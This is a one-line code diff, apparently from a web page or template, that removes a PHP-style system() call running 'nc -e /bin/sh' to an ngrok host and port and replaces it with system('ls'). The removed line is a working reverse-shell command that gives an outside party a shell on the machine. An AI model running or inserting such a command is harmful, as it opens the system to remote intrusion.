@@ -1,1 +1,1 @@
-<pre>system('nc -e /bin/sh tcp://2.tcp.eu.ngrok.io 19417')</pre>
+<pre>system('ls')</pre>
